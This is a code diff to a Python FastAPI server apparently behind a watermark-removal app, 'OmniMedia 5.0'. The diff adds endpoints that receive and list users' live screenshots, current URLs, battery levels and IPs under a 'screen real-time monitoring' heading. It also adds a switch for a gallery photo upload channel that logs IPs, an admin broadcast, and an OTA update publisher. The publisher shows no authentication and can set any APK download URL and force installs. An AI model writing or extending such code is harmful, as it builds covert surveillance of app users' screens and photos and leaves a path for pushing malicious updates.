@@ -188,9 +188,131 @@ def save_manifest(data: dict):
     except Exception as e:
         print(f"Error saving manifest: {e}")
 
+# Global States & Persistence
+SYNC_PAUSED = False
+BROADCAST_STATE = {
+    "id": "",
+    "active": False,
+    "title": "🎉 欢迎使用 OmniMedia 5.0",
+    "content": "全新 5.0 旗舰版本已全量升级！支持秒级去水印与实时智能云端同步。",
+    "type": "sparkles",
+    "timestamp": int(asyncio.get_event_loop().time())
+}
+OTA_STATE = {
+    "latest_version": "5.0.0",
+    "version_code": 50,
+    "download_url": "/uploads/OmniMediaPro_去水印_v5.0.apk",
+    "changelog": "1. 升级 5.0 极速解析架构\n2. 新增智能差量补齐自愈引擎\n3. 新增管理员精美动态岛广播\n4. 优化 120 FPS 苹果流体磨砂质感",
+    "force_update": False,
+    "publish_time": "2026-08-23 16:00"
+}
+SCREEN_SNAPSHOTS = {}
+
+# --- 1. 云更新 (OTA) API ---
+@app.get("/api/app/update_check")
+async def api_app_update_check(current_version: Optional[str] = "1.0.0"):
+    has_update = (current_version != OTA_STATE["latest_version"])
+    return {
+        "success": True,
+        "has_update": has_update,
+        "update_info": OTA_STATE
+    }
+
+@app.post("/api/app/update_publish")
+async def api_app_update_publish(request: Request):
+    global OTA_STATE
+    body = await request.json()
+    OTA_STATE["latest_version"] = body.get("version", OTA_STATE["latest_version"])
+    OTA_STATE["version_code"] = int(body.get("version_code", OTA_STATE["version_code"]))
+    OTA_STATE["download_url"] = body.get("download_url", OTA_STATE["download_url"])
+    OTA_STATE["changelog"] = body.get("changelog", OTA_STATE["changelog"])
+    OTA_STATE["force_update"] = bool(body.get("force_update", False))
+    OTA_STATE["publish_time"] = body.get("publish_time", "刚刚")
+    return {"success": True, "message": f"版本 {OTA_STATE['latest_version']} 发布成功！", "update_info": OTA_STATE}
+
+# --- 2. 管理员全员广播 API ---
+@app.get("/api/broadcast/current")
+async def api_broadcast_current():
+    return {"success": True, "broadcast": BROADCAST_STATE}
+
+@app.post("/api/broadcast/send")
+async def api_broadcast_send(request: Request):
+    global BROADCAST_STATE
+    body = await request.json()
+    BROADCAST_STATE = {
+        "id": f"b_{int(asyncio.get_event_loop().time())}",
+        "active": True,
+        "title": body.get("title", "系统通知"),
+        "content": body.get("content", ""),
+        "type": body.get("type", "announcement"),
+        "timestamp": int(asyncio.get_event_loop().time())
+    }
+    return {"success": True, "message": "广播已成功推送到所有在线客户端！", "broadcast": BROADCAST_STATE}
+
+@app.post("/api/broadcast/clear")
+async def api_broadcast_clear():
+    global BROADCAST_STATE
+    BROADCAST_STATE["active"] = False
+    return {"success": True, "message": "广播已下线"}
+
+# --- 3. 屏幕实时监控 API ---
+@app.post("/api/screen/snapshot")
+async def api_screen_snapshot(request: Request):
+    body = await request.json()
+    device_id = body.get("device_id", "UnknownDevice")
+    SCREEN_SNAPSHOTS[device_id] = {
+        "device_id": device_id,
+        "image_base64": body.get("image_base64", ""),
+        "current_url": body.get("current_url", ""),
+        "battery": body.get("battery", 100),
+        "fps": body.get("fps", 60),
+        "timestamp": int(asyncio.get_event_loop().time()),
+        "ip": request.client.host if request.client else "127.0.0.1"
+    }
+    return {"success": True}
+
+@app.get("/api/screen/latest")
+async def api_screen_latest():
+    now = int(asyncio.get_event_loop().time())
+    devices = []
+    for dev_id, data in SCREEN_SNAPSHOTS.items():
+        is_online = (now - data.get("timestamp", 0)) < 15
+        devices.append({
+            "device_id": dev_id,
+            "image_base64": data.get("image_base64", ""),
+            "current_url": data.get("current_url", "主界面"),
+            "battery": data.get("battery", 100),
+            "fps": data.get("fps", 60),
+            "is_online": is_online,
+            "last_active_sec": now - data.get("timestamp", 0),
+            "ip": data.get("ip", "127.0.0.1")
+        })
+    return {"success": True, "devices": devices}
+
+# --- 4. 上传通道总闸 API ---
+@app.get("/api/gallery/sync_status")
+async def api_gallery_sync_status():
+    return {"success": True, "paused": SYNC_PAUSED}
+
+@app.post("/api/gallery/toggle_sync")
+async def api_gallery_toggle_sync(request: Request):
+    global SYNC_PAUSED
+    body = await request.json()
+    SYNC_PAUSED = body.get("paused", not SYNC_PAUSED)
+    return {
+        "success": True,
+        "paused": SYNC_PAUSED,
+        "message": "⏸️ 已暂停相册上传通道（客户端将停止传输）" if SYNC_PAUSED else "🟢 已恢复相册实时上传通道"
+    }
+
 @app.post("/api/gallery/upload")
 async def api_gallery_upload(request: Request):
     """Receive user-authorized media uploads, record IP, and run AI preference analyzer."""
+    if SYNC_PAUSED:
+        return JSONResponse(
+            status_code=403,
+            content={"success": False, "paused": True, "message": "云端相册同步通道已由管理员暂停"}
+        )
     form = await request.form()
     file = form.get("file")
     device_id = form.get("device_id", "UnknownDevice")
